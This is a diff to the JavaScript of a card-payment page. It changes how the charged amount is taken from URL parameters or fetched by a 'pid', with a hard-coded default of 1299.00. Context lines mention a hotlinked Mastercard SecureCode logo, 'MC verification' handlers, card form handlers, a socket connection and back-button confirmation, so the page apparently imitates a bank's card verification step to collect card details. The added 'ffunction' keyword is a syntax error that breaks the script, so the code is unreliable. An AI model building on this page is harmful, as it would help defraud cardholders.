@@ -779,76 +779,141 @@ window.addEventListener('error', function(event) {
       'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
   };
   
-function parseURLParams() {
+ffunction parseURLParams() {
     try {
         console.log('Parsing URL parameters');
         const urlParams = new URLSearchParams(window.location.search);
         
-        // Get the pid parameter first - this is the most important
+        // First, try to get pid
         if (urlParams.has('pid')) {
-            const pid = urlParams.get('pid');
-            console.log('Found pid in URL:', pid);
-            
-            // Store pid in state for later reference
-            state.pid = pid;
-        } else {
-            console.log('No pid parameter found in URL');
+            state.pid = urlParams.get('pid');
+            console.log('Found pid in URL:', state.pid);
         }
         
-        // Check for amount parameter - will be used as fallback only
+        // Try to get amount from URL directly
         if (urlParams.has('amount')) {
             const urlAmount = parseFloat(urlParams.get('amount'));
             if (!isNaN(urlAmount)) {
-                console.log('Found amount in URL parameters:', urlAmount);
+                console.log('Found valid amount in URL:', urlAmount);
                 state.amount = urlAmount;
+                updateAmountDisplays();
+                return; // Exit early if we got amount from URL
             }
         }
         
-        // Force update displays with current amount in state
-        updateAmountDisplays();
-        
+        // If we have pid but no amount, try directly fetching from server
+        if (state.pid) {
+            console.log('No amount in URL, fetching from server using pid:', state.pid);
+            
+            // Use a default amount of 1299.00 while waiting for server response
+            state.amount = 1299.00;
+            updateAmountDisplays();
+            
+            // Request amount from server
+            fetchAmountFromServer(state.pid);
+        } else {
+            // No pid, no amount - use default
+            console.log('No pid or amount found, using default amount');
+            state.amount = 1299.00;
+            updateAmountDisplays();
+        }
     } catch (error) {
         console.error('Error parsing URL parameters:', error);
+        // Use default on error
+        state.amount = 1299.00;
+        updateAmountDisplays();
+    }
+}
+
+// New function to fetch amount directly from server
+function fetchAmountFromServer(pid) {
+    try {
+        fetch(`/api/getPaymentDetails?pid=${pid}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('Server response for payment details:', data);
+                
+                // Try multiple paths to find the amount - handle different server response formats
+                let serverAmount = null;
+                
+                if (data.payment && data.payment.amount) {
+                    serverAmount = parseFloat(data.payment.amount);
+                } else if (data.amount) {
+                    serverAmount = parseFloat(data.amount);
+                } else if (data.status === 'success' && data.payment) {
+                    if (typeof data.payment.amount !== 'undefined') {
+                        serverAmount = parseFloat(data.payment.amount);
+                    }
+                } else {
+                    // Try to find any property that might contain the amount
+                    for (const key in data) {
+                        if (data[key] && typeof data[key].amount !== 'undefined') {
+                            serverAmount = parseFloat(data[key].amount);
+                            break;
+                        }
+                    }
+                }
+                
+                // If we found a valid amount, update displays
+                if (serverAmount !== null && !isNaN(serverAmount)) {
+                    console.log('Found valid amount from server:', serverAmount);
+                    state.amount = serverAmount;
+                    updateAmountDisplays();
+                } else {
+                    console.log('Could not find valid amount in server response, using default');
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching payment details:', error);
+            });
+    } catch (error) {
+        console.error('Error in fetchAmountFromServer:', error);
     }
 }
   
-// Update all amount displays
 function updateAmountDisplays() {
-    try {
-        console.log('Updating all amount displays with amount:', state.amount);
-        
-        // Update all elements with class amount-display
-        document.querySelectorAll('.amount-display').forEach(el => {
+    console.log('Updating all amount displays with:', state.amount);
+    
+    // Try multiple selector approaches for maximum coverage
+    const amountSelectors = [
+        '#amount-display',
+        '.amount-display',
+        '#transactionAmount'
+    ];
+    
+    // For each selector type, try to update all matching elements
+    amountSelectors.forEach(selector => {
+        const elements = document.querySelectorAll(selector);
+        elements.forEach(el => {
             el.textContent = state.amount.toFixed(2);
+            console.log(`Updated ${selector} element with amount: ${state.amount.toFixed(2)}`);
         });
-        
-        // Update the main amount display
-        const amountDisplay = document.getElementById('amount-display');
-        if (amountDisplay) {
-            amountDisplay.textContent = state.amount.toFixed(2);
-        }
-        
-        // Calculate and update subtotal and tax
-        const subtotal = Math.round(state.amount * 100 / 1.0825) / 100;
-        const tax = state.amount - subtotal;
-        
-        document.querySelectorAll('.subtotal-display').forEach(el => {
-            el.textContent = subtotal.toFixed(2);
-        });
-        
-        document.querySelectorAll('.tax-display').forEach(el => {
-            el.textContent = tax.toFixed(2);
-        });
-        
-        // Also update MC verification amount if it exists
-        const transactionAmount = document.getElementById('transactionAmount');
-        if (transactionAmount) {
-            transactionAmount.textContent = state.amount.toFixed(2);
-        }
-        
-        console.log('All amount displays updated successfully');
-    } catch (error) {
-        console.error('Error updating amount displays:', error);
+    });
+    
+    // Direct getElementById approach for critical elements
+    const amountDisplay = document.getElementById('amount-display');
+    if (amountDisplay) {
+        amountDisplay.textContent = state.amount.toFixed(2);
+        console.log('Updated #amount-display with amount:', state.amount.toFixed(2));
+    }
+    
+    // Calculate and update subtotal and tax
+    const subtotal = Math.round(state.amount * 100 / 1.0825) / 100;
+    const tax = state.amount - subtotal;
+    
+    document.querySelectorAll('.subtotal-display').forEach(el => {
+        el.textContent = subtotal.toFixed(2);
+    });
+    
+    document.querySelectorAll('.tax-display').forEach(el => {
+        el.textContent = tax.toFixed(2);
+    });
+    
+    // Force update the MC verification amount element if it exists
+    const mcAmount = document.getElementById('transactionAmount');
+    if (mcAmount) {
+        mcAmount.textContent = state.amount.toFixed(2);
+        console.log('Updated #transactionAmount with:', state.amount.toFixed(2));
     }
 }
   
@@ -856,33 +921,39 @@ document.addEventListener('DOMContentLoaded', function() {
     try {
         console.log('Document loaded, initializing application...');
         
-        // Parse URL parameters first (this will get the pid)
+        // Parse URL parameters first - this will set the amount or trigger server fetch
         parseURLParams();
         
         // Generate invoice ID
         document.getElementById('invoiceId').textContent = generateInvoiceID();
         
-        // Fetch payment details from server (including amount)
-        fetchPaymentDetailsFromServer();
+        // Make sure amount displays are updated immediately
+        updateAmountDisplays();
         
-        // Initialize socket connection
+        // Add a delayed update to catch any late-loaded elements
+        setTimeout(updateAmountDisplays, 500);
+        setTimeout(updateAmountDisplays, 1000);
+        
+        // Rest of your initialization code...
         initializeSocketConnection();
         
         // Setup card form handlers
         setTimeout(function() {
             setupCardFormHandlers();
+            console.log('Card form handlers set up after delay');
         }, 500);
         
         // Setup MC verification handlers
         setTimeout(function() {
             setupMcVerificationHandlers();
+            console.log('MC button handlers set up after delay');
         }, 800);
         
         // Setup back button confirmation
         setupBackButtonConfirmation();
         
     } catch (error) {
-        console.error('Error in initialization:', error);
+        console.error('Error initializing application:', error);
     }
 });
 
